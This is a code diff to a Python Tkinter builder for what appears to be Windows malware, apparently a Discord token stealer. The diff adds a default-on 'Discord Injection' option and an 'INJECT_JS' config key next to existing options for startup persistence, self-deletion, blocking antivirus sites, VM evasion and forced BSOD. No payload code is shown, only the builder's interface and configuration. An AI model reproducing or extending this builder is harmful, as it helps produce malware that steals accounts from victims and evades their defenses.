@@ -23,6 +23,7 @@ class Builder:
 		self.Startup = tk.BooleanVar(self.root, True)
 		self.Destruct = tk.BooleanVar(self.root, True)
 		self.blockSites = tk.BooleanVar(self.root, False)
+		self.injectJS = tk.BooleanVar(self.root, True)
 		self.MSGbox = tk.BooleanVar(self.root, False)
 		self.MSGboxconf = dict()
 		self.__main__()
@@ -51,15 +52,17 @@ class Builder:
 		Startup = tk.Checkbutton(self.root, text= "Run On Startup", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.Startup)
 		Destruct = tk.Checkbutton(self.root, text= "Delete Self", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.Destruct)
 		blockSites = tk.Checkbutton(self.root, text= "Block AV Sites", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.blockSites)
+		injectJS = tk.Checkbutton(self.root, text= "Discord Injection", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.injectJS)
 		Messagebox = tk.Checkbutton(self.root, text= "Message Box", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.MSGbox, command= self.MessageboxEvent)
 
-		PingME.place(y = 110, x= 20)
-		VMprotect.place(y = 140, x= 20)
-		BSOD.place(y= 170, x= 20)
-		Startup.place(y= 200, x= 20)
-		Destruct.place(y= 230, x= 20)
-		blockSites.place(y= 260, x= 20)
-		Messagebox.place(y= 290, x= 20)
+		PingME.place(y = 100, x= 20)
+		VMprotect.place(y = 130, x= 20)
+		BSOD.place(y= 160, x= 20)
+		Startup.place(y= 190, x= 20)
+		Destruct.place(y= 220, x= 20)
+		injectJS.place(y= 250, x= 20)
+		blockSites.place(y= 280, x= 20)
+		Messagebox.place(y= 310, x= 20)
 
 		IconNameLabel = ttk.Label(background= "black", foreground= "white", font= ("Franklin Gothic", 10, "bold"), width= 15, anchor= "center")
 		IconNameLabel.place(x= 560, y= 130, anchor= "e")
@@ -130,6 +133,7 @@ class Builder:
     				"STARTUP" : self.Startup.get(),
     				"DELETE_ITSELF" : self.Destruct.get(),
 				    "BLOCK_SITES" : self.blockSites.get(),
+				    "INJECT_JS" : self.injectJS.get(),
 					"MSGBOX" : self.MSGboxconf
 			}
 			json.dump(configuration, file, indent= 4)
